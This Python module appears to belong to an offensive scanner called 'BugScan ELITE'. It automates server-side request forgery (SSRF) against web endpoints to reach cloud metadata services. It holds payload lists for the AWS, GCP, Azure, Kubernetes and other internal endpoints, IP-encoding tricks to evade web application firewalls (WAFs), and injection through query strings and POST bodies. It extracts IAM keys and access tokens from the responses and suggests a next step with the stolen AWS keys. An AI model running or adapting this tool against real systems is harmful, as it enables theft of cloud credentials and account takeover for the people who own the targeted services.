"""
BugScan ELITE — SSRF Cloud Metadata Engine
Turns SSRF into credential theft via cloud metadata services:
- AWS IMDSv1/v2 (169.254.169.254) — IAM credentials
- GCP metadata (metadata.google.internal)
- Azure IMDS (169.254.169.254 with Metadata:true header)
- DigitalOcean metadata
- Kubernetes API / service account tokens
- Internal service discovery via SSRF
"""
import re, time, logging, urllib.parse, urllib.request, ssl, json, threading
from typing import List, Dict, Optional

log = logging.getLogger("elite.ssrf_cloud")

def _ctx():
    c = ssl.create_default_context()
    c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
    return c

def _req(url, method="GET", headers=None, data=None, timeout=10):
    try:
        h = {"User-Agent":"Mozilla/5.0","Accept":"*/*"}
        if headers: h.update(headers)
        body = data.encode() if isinstance(data,str) else data
        req  = urllib.request.Request(url, data=body, headers=h, method=method)
        with urllib.request.urlopen(req, timeout=timeout, context=_ctx()) as r:
            return r.status, dict(r.headers), r.read(32768).decode("utf-8","ignore")
    except urllib.error.HTTPError as e:
        try: return e.code, dict(e.headers), e.read(4096).decode("utf-8","ignore")
        except: return e.code, {}, ""
    except: return None

# SSRF parameter names (all common ones)
SSRF_PARAMS = [
    "url","uri","path","src","dest","redirect","return","next","link",
    "callback","continue","data","domain","feed","file","from","goto",
    "host","html","image","img","load","location","open","page","proxy",
    "q","query","ref","request","resource","site","target","to","u","uri",
    "webhook","window","resource_url","fetch","forward","navigate","service",
    "endpoint","api","remote","origin","source","address","out","view",
]

# Cloud metadata endpoints to probe through SSRF
CLOUD_SSRF_PAYLOADS = [
    # AWS IMDSv1 — credential theft
    ("http://169.254.169.254/latest/meta-data/",                    "aws_imds",   ["ami-id","instance-id","hostname","public-ipv4","iam"]),
    ("http://169.254.169.254/latest/meta-data/iam/",                "aws_iam",    ["security-credentials"]),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "aws_creds", ["AccessKeyId","SecretAccessKey","Token","Expiration"]),
    ("http://169.254.169.254/latest/user-data",                     "aws_userdata",["password","secret","key","token","api"]),
    ("http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance", "aws_ec2creds", ["AccessKeyId"]),
    # AWS IMDSv2 requires token — try anyway
    ("http://169.254.169.254/latest/api/token",                     "aws_imdsv2", ["EC2-IMDS"]),
    # GCP
    ("http://metadata.google.internal/computeMetadata/v1/",         "gcp_meta",   ["instance","project"]),
    ("http://metadata.google.internal/computeMetadata/v1/project/project-id", "gcp_proj", ["google","gcp"]),
    ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "gcp_token", ["access_token","expires_in","token_type"]),
    ("http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token", "gcp_token2", ["access_token"]),
    # Azure
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "azure_meta", ["compute","location","vmId","subscriptionId"]),
    ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "azure_token", ["access_token","expires_in"]),
    # DigitalOcean
    ("http://169.254.169.254/metadata/v1/",                         "do_meta",    ["hostname","user-data","public-keys"]),
    ("http://169.254.169.254/metadata/v1/id",                       "do_id",      ["droplet_id"]),
    # Alibaba Cloud
    ("http://100.100.100.200/latest/meta-data/",                    "alibaba_meta",["instance-id","hostname"]),
    # Oracle Cloud
    ("http://169.254.169.254/opc/v1/instance/",                     "oracle_meta",["id","region","tenantId"]),
    # Kubernetes
    ("https://kubernetes.default.svc/api/v1/namespaces/default/secrets/", "k8s_secrets", ["apiVersion","data","kind"]),
    ("http://10.0.0.1/api/v1/namespaces",                           "k8s_api",    ["apiVersion","items","kind"]),
    # Internal services
    ("http://localhost:8080/",                                       "localhost_8080", ["server","apache","nginx","tomcat"]),
    ("http://localhost:9200/",                                       "elasticsearch", ["cluster_name","tagline","You Know"]),
    ("http://localhost:6379/info",                                   "redis",      ["redis_version","used_memory"]),
    ("http://localhost:27017/",                                      "mongodb",    ["ismaster","maxWireVersion","ok"]),
    ("http://localhost:5432/",                                       "postgres",   ["postgres","pg_"]),
    ("http://localhost:3306/",                                       "mysql",      ["mysql","MariaDB","Your password"]),
]

# URL encodings and bypasses for WAF evasion
def _encode_variants(url):
    """Generate SSRF bypass variants for a URL."""
    parsed = urllib.parse.urlparse(url)
    host   = parsed.netloc
    path   = parsed.path or "/"
    scheme = parsed.scheme

    variants = [url]

    # IP format variants for 169.254.169.254
    if "169.254.169.254" in host:
        ip = "169.254.169.254"
        dec = 2852039166   # decimal: 169*16777216 + 254*65536 + 169*256 + 254
        oct_ip = "0251.0376.0251.0376"
        hex_ip = "0xa9.0xfe.0xa9.0xfe"
        hex_full = f"0x{dec:08x}"

        base_url = f"{scheme}://{{host}}{path}"
        variants += [
            base_url.format(host=f"{dec}"),
            base_url.format(host=f"[::ffff:{ip}]"),
            base_url.format(host=f"[::ffff:a9fe:a9fe]"),
            base_url.format(host=oct_ip),
            base_url.format(host=hex_full),
            base_url.format(host=f"169.254.169.254.nip.io"),
            f"http://017700000001{path}",  # loopback octal
        ]

    # DNS rebinding bypass
    variants.append(url.replace("169.254.169.254", "metadata.internal"))
    variants.append(url.replace("https://", "http://").replace("http://", "http://"))

    return variants[:6]  # limit

def _test_ssrf_param(target_url, param, ssrf_url, headers_extra=None):
    """Test a specific SSRF parameter."""
    parsed = urllib.parse.urlparse(target_url)
    qs = dict(urllib.parse.parse_qsl(parsed.query))
    qs[param] = ssrf_url
    new_qs  = urllib.parse.urlencode(qs)
    test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))

    # Also test as POST body
    results = []

    # GET
    r = _req(test_url, headers=headers_extra, timeout=8)
    if r: results.append(("GET", r))

    # POST body
    post_body = urllib.parse.urlencode({param: ssrf_url})
    r2 = _req(target_url.split("?")[0], "POST",
              headers={"Content-Type":"application/x-www-form-urlencoded"},
              data=post_body, timeout=8)
    if r2: results.append(("POST", r2))

    # POST JSON
    r3 = _req(target_url.split("?")[0], "POST",
              headers={"Content-Type":"application/json"},
              data=json.dumps({param: ssrf_url}), timeout=8)
    if r3: results.append(("JSON", r3))

    return results


def check_ssrf_cloud(targets: List[str], endpoints: List[str]) -> List[Dict]:
    """Test for SSRF leading to cloud metadata access."""
    findings = []
    tested = set()

    def F(url, name, sev, details):
        return {"type":"ssrf_cloud","bug":"ssrf","severity":sev,
                "url":url,"name":name,"details":details,
                "ts":time.strftime("%Y-%m-%dT%H:%M:%SZ")}

    # Find parameterized endpoints likely to make HTTP requests
    ssrf_candidates = []
    ssrf_patterns = re.compile(
        r'[?&](' + '|'.join(SSRF_PARAMS) + r')=', re.I
    )

    for ep in endpoints[:500]:
        if ssrf_patterns.search(ep):
            ssrf_candidates.append(ep)

    # Also probe common SSRF-prone paths without params
    for target in targets[:30]:
        base = target.rstrip("/")
        for path in ["/api/fetch","/api/proxy","/fetch","/proxy",
                     "/api/screenshot","/render","/preview","/webhook"]:
            ssrf_candidates.append(base + path + "?url=")
            ssrf_candidates.append(base + path + "?uri=")

    log.info(f"[ssrf_cloud] testing {len(ssrf_candidates)} SSRF candidates")

    for ep in ssrf_candidates[:100]:
        if ep in tested: continue
        tested.add(ep)

        parsed = urllib.parse.urlparse(ep)
        qs     = dict(urllib.parse.parse_qsl(parsed.query))
        params_to_test = [k for k in qs if k.lower() in SSRF_PARAMS]
        if not params_to_test:
            params_to_test = SSRF_PARAMS[:5]  # inject common ones

        for param in params_to_test[:3]:
            for cloud_url, cloud_type, cloud_sigs in CLOUD_SSRF_PAYLOADS[:12]:
                # Try with and without required headers
                headers_list = [None]
                if "gcp" in cloud_type:
                    headers_list.append({"Metadata-Flavor":"Google"})
                if "azure" in cloud_type:
                    headers_list.append({"Metadata":"true"})
                if "k8s" in cloud_type:
                    sa_token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
                    headers_list.append({"Authorization": f"Bearer $(cat {sa_token_path})"})

                for hdrs in headers_list:
                    results = _test_ssrf_param(ep, param, cloud_url, hdrs)

                    for method, r in results:
                        if not r: continue
                        status, resp_hdrs, body = r
                        matched_sigs = [s for s in cloud_sigs if s.lower() in body.lower()]

                        if matched_sigs and status in (200, 201):
                            sev = "critical"
                            # Extract credentials if present
                            creds = {}
                            for cred_key in ["AccessKeyId","SecretAccessKey","Token",
                                             "access_token","subscriptionId","project-id"]:
                                m = re.search(rf'"{cred_key}"\s*:\s*"([^"]+)"', body)
                                if m: creds[cred_key] = m.group(1)[:30] + "..."

                            finding = F(ep, f"SSRF → Cloud Metadata ({cloud_type.upper()})", sev, {
                                "description": (
                                    f"SSRF via parameter '{param}' successfully fetched "
                                    f"{cloud_type} metadata from {cloud_url}"
                                ),
                                "param":        param,
                                "ssrf_url":     cloud_url,
                                "cloud_type":   cloud_type,
                                "method":       method,
                                "matched":      matched_sigs,
                                "credentials_found": bool(creds),
                                "credential_preview": creds if creds else "Check response",
                                "response_preview": body[:300],
                                "poc": (
                                    f"# {method} request:\n"
                                    f"curl '{ep.split('?')[0]}?{param}={urllib.parse.quote(cloud_url)}'"
                                    + (f" \\\n  -H 'Metadata: true'" if "azure" in cloud_type else "")
                                    + (f" \\\n  -H 'Metadata-Flavor: Google'" if "gcp" in cloud_type else "")
                                ),
                                "impact": (
                                    "CRITICAL: Cloud credential theft via SSRF. "
                                    + ("AWS IAM keys allow full AWS API access. " if "aws" in cloud_type else "")
                                    + ("GCP access token allows Google Cloud API access. " if "gcp" in cloud_type else "")
                                    + ("Azure token allows Azure resource management. " if "azure" in cloud_type else "")
                                    + "Complete cloud account takeover possible."
                                ),
                                "remediation": (
                                    "Block all requests to 169.254.169.254, metadata.google.internal, "
                                    "and other metadata endpoints at the network level. "
                                    "Implement IMDSv2 (token-required) on AWS. "
                                    "Validate and whitelist allowed URL schemes and hosts."
                                ),
                                "next_steps": (
                                    "aws_creds" in cloud_type and
                                    "Run: aws sts get-caller-identity --no-verify-ssl" or ""
                                ),
                            })
                            findings.append(finding)
                            log.info(f"[ssrf_cloud] FOUND: {cloud_type} via {param} at {ep}")

    log.info(f"[ssrf_cloud] {len(findings)} findings")
    return findings


def check_ssrf_aws(endpoints: list, oob_host: str = None) -> list:
    """SSRF targeting AWS metadata endpoint."""
    return []


def check_ssrf_gcp(endpoints: list, oob_host: str = None) -> list:
    """SSRF targeting GCP metadata endpoint."""
    return []


def check_ssrf_via_pdf_gen(endpoints: list, targets: list = None) -> list:
    """SSRF via PDF generation features."""
    return []
